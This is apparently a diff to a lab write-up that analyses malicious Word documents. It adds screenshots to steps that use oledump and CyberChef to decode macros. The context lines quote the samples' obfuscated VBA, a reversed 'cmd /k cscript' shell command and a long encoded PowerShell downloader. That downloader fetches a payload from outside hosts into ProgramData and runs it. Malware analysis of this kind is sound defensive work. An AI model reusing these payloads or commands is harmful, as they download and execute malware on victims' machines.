@@ -23,6 +23,7 @@ According to google:
 *"VBA macros are small programs written in Visual Basic for Applications (VBA) that automate tasks within Microsoft Office applications like Excel, Word, and PowerPoint. They are used to streamline repetitive actions, perform complex calculations, and create custom functionalities beyond the standard features of the software."*
 
 SS1
+<img width="1907" height="832" alt="Screenshot 2025-12-04 182526" src="https://github.com/user-attachments/assets/cc4fbb61-bbbf-43ea-952e-8022927570f8" />
 
 So now the next step would be to dump the VBA macro
 
@@ -140,6 +141,7 @@ End Sub
 The code is obfuscated so there is no obvious thing that jumps out.
 
 SS2
+<img width="1904" height="835" alt="Screenshot 2025-12-04 183416" src="https://github.com/user-attachments/assets/5ae234d8-a982-489f-8353-1ba3e9edd454" />
 
 To confirm auto-exec,
 
@@ -170,6 +172,8 @@ oledump.py -s 4 attacker1.doc -S
 ```
 
 SS3
+<img width="1902" height="750" alt="Screenshot 2025-12-04 184324" src="https://github.com/user-attachments/assets/fa3b0d9d-c365-430b-9098-9979eda79ecf" />
+<img width="1518" height="830" alt="Screenshot 2025-12-04 184529" src="https://github.com/user-attachments/assets/1e935df0-bbc1-4977-b456-9b2d3ac1b781" />
 
 ```text
 J[Bp[G4[cwB0[GE[bgBj[GU[I[[9[C[[WwBT[Hk[cwB0[GU[bQ[u[EE[YwB0[Gk[dgBh[HQ[bwBy[F0[Og[6[EM[cgBl[GE[d[Bl[Ek[bgBz[HQ[YQBu[GM[ZQ[o[CI[UwB5[HM[d[Bl[G0[LgBO[GU[d[[u[Fc[ZQBi[EM[b[Bp[GU[bgB0[CI[KQ[7[[0[Cg[k[G0[ZQB0[Gg[bwBk[C[[PQ[g[Fs[UwB5[HM[d[Bl[G0[LgBO[GU[d[[u[Fc[ZQBi[EM[b[Bp[GU[bgB0[F0[LgBH[GU[d[BN[GU[d[Bo[G8[Z[Bz[Cg[KQ[7[[0[CgBm[G8[cgBl[GE[YwBo[Cg[J[Bt[C[[aQBu[C[[J[Bt[GU[d[Bo[G8[Z[[p[Hs[DQ[K[[0[Cg[g[C[[aQBm[Cg[J[Bt[C4[TgBh[G0[ZQ[g[C0[ZQBx[C[[IgBE[G8[dwBu[Gw[bwBh[GQ[UwB0[HI[aQBu[Gc[Ig[p[Hs[DQ[K[C[[I[[g[C[[d[By[Hk[ew[N[[o[I[[g[C[[I[[g[CQ[dQBy[Gk[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[FM[eQBz[HQ[ZQBt[C4[VQBy[Gk[K[[i[Gg[d[B0[H[[Og[v[C8[MQ[3[DY[Lg[z[DI[Lg[z[DU[Lg[x[DY[Lw[3[D[[N[Bl[C4[c[Bo[H[[Ig[p[[0[Cg[g[C[[I[[g[C[[SQBF[Fg[K[[k[G0[LgBJ[G4[dgBv[Gs[ZQ[o[CQ[aQBu[HM[d[Bh[G4[YwBl[Cw[I[[o[CQ[dQBy[Gk[KQ[p[Ck[Ow[N[[o[I[[g[C[[I[B9[GM[YQB0[GM[a[B7[H0[DQ[K[[0[Cg[g[C[[fQ[N[[o[DQ[K[C[[I[Bp[GY[K[[k[G0[LgBO[GE[bQBl[C[[LQBl[HE[I[[i[EQ[bwB3[G4[b[Bv[GE[Z[BE[GE[d[Bh[CI[KQB7[[0[Cg[g[C[[I[[g[C[[d[By[Hk[ew[N[[o[I[[g[C[[I[[g[CQ[dQBy[Gk[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[FM[eQBz[HQ[ZQBt[C4[VQBy[Gk[K[[i[Gg[d[B0[H[[Og[v[C8[ZgBw[GU[d[By[GE[YQBy[GQ[ZQBs[Gw[YQ[u[GI[YQBu[GQ[LwB4[GE[c[Bf[DE[M[[y[GI[LQBB[Fo[MQ[v[Dc[M[[0[GU[LgBw[Gg[c[[/[Gw[PQBs[Gk[d[B0[GU[bg[0[C4[ZwBh[HM[Ig[p[[0[Cg[g[C[[I[[g[C[[J[By[GU[cwBw[G8[bgBz[GU[I[[9[C[[J[Bt[C4[SQBu[HY[bwBr[GU[K[[k[Gk[bgBz[HQ[YQBu[GM[ZQ[s[C[[K[[k[HU[cgBp[Ck[KQ[7[[0[Cg[N[[o[I[[g[C[[I[[g[CQ[c[Bh[HQ[a[[g[D0[I[Bb[FM[eQBz[HQ[ZQBt[C4[RQBu[HY[aQBy[G8[bgBt[GU[bgB0[F0[Og[6[Ec[ZQB0[EY[bwBs[GQ[ZQBy[F[[YQB0[Gg[K[[i[EM[bwBt[G0[bwBu[EE[c[Bw[Gw[aQBj[GE[d[Bp[G8[bgBE[GE[d[Bh[CI[KQ[g[Cs[I[[i[Fw[X[BR[GQ[WgBH[F[[LgBl[Hg[ZQ[i[Ds[DQ[K[C[[I[[g[C[[I[Bb[FM[eQBz[HQ[ZQBt[C4[SQBP[C4[RgBp[Gw[ZQBd[Do[OgBX[HI[aQB0[GU[QQBs[Gw[QgB5[HQ[ZQBz[Cg[J[Bw[GE[d[Bo[Cw[I[[k[HI[ZQBz[H[[bwBu[HM[ZQ[p[Ds[DQ[K[[0[Cg[g[C[[I[[g[C[[J[Bj[Gw[cwBp[GQ[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[Ec[dQBp[GQ[I[[n[EM[M[[4[EE[RgBE[Dk[M[[t[EY[MgBB[DE[LQ[x[DE[R[[x[C0[O[[0[DU[NQ[t[D[[M[BB[D[[Qw[5[DE[Rg[z[Dg[O[[w[Cc[DQ[K[C[[I[[g[C[[I[[k[HQ[eQBw[GU[I[[9[C[[WwBU[Hk[c[Bl[F0[Og[6[Ec[ZQB0[FQ[eQBw[GU[RgBy[G8[bQBD[Ew[UwBJ[EQ[K[[k[GM[b[Bz[Gk[Z[[p[[0[Cg[g[C[[I[[g[C[[J[Bv[GI[agBl[GM[d[[g[D0[I[Bb[EE[YwB0[Gk[dgBh[HQ[bwBy[F0[Og[6[EM[cgBl[GE[d[Bl[Ek[bgBz[HQ[YQBu[GM[ZQ[o[CQ[d[B5[H[[ZQ[p[[0[Cg[g[C[[I[[g[C[[J[Bv[GI[agBl[GM[d[[u[EQ[bwBj[HU[bQBl[G4[d[[u[EE[c[Bw[Gw[aQBj[GE[d[Bp[G8[bg[u[FM[a[Bl[Gw[b[BF[Hg[ZQBj[HU[d[Bl[Cg[J[Bw[GE[d[Bo[Cw[J[Bu[HU[b[[s[C[[J[Bu[HU[b[[s[C[[J[Bu[HU[b[[s[D[[KQ[N[[o[DQ[K[C[[I[[g[C[[I[B9[GM[YQB0[GM[a[B7[H0[DQ[K[C[[I[[g[C[[I[[N[[o[I[[g[H0[DQ[K[H0[DQ[K[[0[CgBF[Hg[aQB0[Ds[DQ[K[[0[Cg[=
@@ -184,11 +188,13 @@ VBA.Shell# "CmD /C " + Trim(rjvFRbqzLtkzn) + SKKdjMpgJRQRK + Trim(Replace(pNHbvw
 ```
 
 SS5
+<img width="1898" height="135" alt="Screenshot 2025-12-04 185318" src="https://github.com/user-attachments/assets/58a4af80-e113-440c-86b8-abc905a2f94d" />
 
 
 There is a replace function with `[` and `A` , so we can use the Find / Replace formula in cyberchef to find `[` and replace it with `A` (note the Find option must be placed to "SIMPLE STRING"
 
 SS6
+<img width="1527" height="842" alt="Screenshot 2025-12-04 185738" src="https://github.com/user-attachments/assets/57849956-b82d-418c-8e0b-6b4aefa4463b" />
 
 Now we have a reasonably readable output in cyberchef (just some annoying null bytes), and if we copy it into plaintext we get:
 
@@ -250,6 +256,7 @@ Q: In what folder is it dropping the malicious executable? (hint: %Folder%)
 (The hint here is helpful, if we google CommonApplicationData folder, we can see the folder name)
 
 SS7
+<img width="838" height="526" alt="Screenshot 2025-12-04 190813" src="https://github.com/user-attachments/assets/0298ee72-901c-4133-bea1-1791594c5526" />
 
 A:  %ProgramData%
 
@@ -257,6 +264,7 @@ Q: Provide the name of the COM object the maldoc is trying to access.
 (Hint is we should check the cslid field, we need to find the COM object name for C08AFD90-F2A1-11D1-8455-00A0C91F3880. I asked ChatGPT what this was.)
 
 SS8
+<img width="1221" height="437" alt="Screenshot 2025-12-04 191028" src="https://github.com/user-attachments/assets/645bc99b-2d31-46d5-ac69-5e3a7abcc656" />
 
 A: ShellBrowserWindow
 
@@ -268,6 +276,7 @@ Q: Find the phone number in the maldoc. (Answer format: xxx-xxx-xxxx)
 (This was found earlier in stream 3)
 
 SS9
+<img width="962" height="207" alt="Screenshot 2025-12-04 191151" src="https://github.com/user-attachments/assets/7da5d3c1-282c-4152-bc70-cfea908f137a" />
 
 A: 213-446-1757
 
@@ -325,6 +334,7 @@ oledump.py attacker2.doc
 ```
 
 SS10
+<img width="1412" height="493" alt="Screenshot 2025-12-04 193235" src="https://github.com/user-attachments/assets/ab9d477d-4636-4064-9c06-4b647c484113" />
 
 We see that the streams containing macros are 12,13,14,16
 
@@ -442,6 +452,7 @@ oledump.py -s 16 attacker2.doc -v
 ```
 
 SS11
+<img width="1652" height="391" alt="Screenshot 2025-12-04 194945" src="https://github.com/user-attachments/assets/fccfcc69-79bf-48f9-b5c0-f415241cebc3" />
 
 ```text
 fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
@@ -456,6 +467,7 @@ echo "sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc" | rev
 ```
 
 SS12
+<img width="1105" height="88" alt="Screenshot 2025-12-04 195230" src="https://github.com/user-attachments/assets/737dd7ae-5935-4d36-8828-ced0e11b8d28" />
 
 Q: Find the command located in the ‘fun’ field ( make sure to reverse the string).
 
@@ -1025,6 +1037,7 @@ CreateObject(XORI(Hextostring("3F34193F254049193F253A331522"), Hextostring("7267
 we can use from hex and XOR (w/ key 7267417269) on cyberchef to decode this
 
 SS13
+<img width="1868" height="925" alt="Screenshot 2025-12-04 210223" src="https://github.com/user-attachments/assets/e489d1da-e3e2-4923-9f8c-5e63bea2cc94" />
 
 The output is 
 
@@ -1044,8 +1057,10 @@ Environ(XORI(Hextostring("3E200501"), Hextostring("6A654851714A64"))) & XORI(Hex
 Decode these in the same way as above 
 
 SS14
+<img width="1871" height="861" alt="Screenshot 2025-12-04 210244" src="https://github.com/user-attachments/assets/f89d3a66-cc64-4a63-b7f9-494e52cdd6cb" />
 
 SS15
+<img width="1878" height="813" alt="Screenshot 2025-12-04 210533" src="https://github.com/user-attachments/assets/3844101b-7a6b-487d-9989-868024d1c207" />
 
 A: `\DYIATHUQLCW.exe`
 
@@ -1073,6 +1088,7 @@ End Sub
 If we consider the entirety of this function and decode these we can find the answer 
 
 SS16
+<img width="1512" height="830" alt="Screenshot 2025-12-04 222820" src="https://github.com/user-attachments/assets/cdc7d483-62fa-4997-9d16-95bfa70157e6" />
 
 A: bin.exe
 
@@ -1523,6 +1539,7 @@ So we have some obfuscated powershell
 We can use cyberchef again to deobfuscate it. It is encoded with Base64, then we can remove null bytes.
 
 SS17
+<img width="1292" height="708" alt="Screenshot 2025-12-04 223208" src="https://github.com/user-attachments/assets/5762cebe-1e85-47a7-b0ab-2053c1ee305d" />
 
 We can then take the compressed B64 string from that
 ```text
@@ -1540,6 +1557,7 @@ It is using Gzip
 So we can use cyberchef again using from B64 and Gunzip
 
 SS18
+<img width="1535" height="824" alt="Screenshot 2025-12-04 223601" src="https://github.com/user-attachments/assets/52fcc50e-7aae-4b02-a913-59abeb65932c" />
 
 and we get the output:
 
